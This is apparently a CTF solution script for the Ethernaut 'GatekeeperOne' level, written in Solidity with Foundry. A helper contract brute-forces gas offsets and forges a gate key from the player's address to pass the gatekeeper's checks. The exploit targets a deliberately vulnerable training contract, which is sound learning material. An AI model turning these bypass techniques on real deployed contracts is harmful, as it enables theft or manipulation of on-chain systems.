// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

/**
 *
 * Level address: 0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C
 * Make it past the gatekeeper and register as an entrant to pass this level.
 *
 * Things that might help:
 * Remember what you've learned from the Telephone and Token levels.
 * You can learn more about the special function gasleft(),
 * in Solidity's documentation (see Units and Global Variables
 * and External Function Calls).
 *
 */
contract Pawn {
    GatekeeperOne private gatekeeper;

    constructor(GatekeeperOne _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

    function recon(bytes8 _gateKey) public returns (uint256) {
        for (uint256 offset = 0; offset < 8191; offset++) {
            (bool success,) = address(gatekeeper).call{gas: 8191 * 3 + offset}(
                abi.encodeWithSignature(("enter(bytes8)"), _gateKey)
            );
            if (success) {
                return offset;
            }
        }
        return 0;
    }

    function attack(bytes8 _gateKey, uint256 offset) public {
        gatekeeper.enter{gas: 8191 * 3 + offset}(_gateKey);
    }
}

contract GatekeeperOneScript is Attacker {
    Level private level = Level(0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        GatekeeperOne gatekeeper = GatekeeperOne(instance);
        Pawn pawn = new Pawn(gatekeeper);
        bytes8 gateKey = bytes8(uint64(uint160(me.addr)));
        bytes8 mask = bytes8(uint64(0xFFFF_FFFF_0000_FFFF));
        gateKey = gateKey & mask;

        uint256 offset = pawn.recon(gateKey);
        console.log("Offset: %d", offset);

        // pawn.attack(gateKey, 256);

        require(gatekeeper.entrant() == me.addr, "Entrant not registered");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
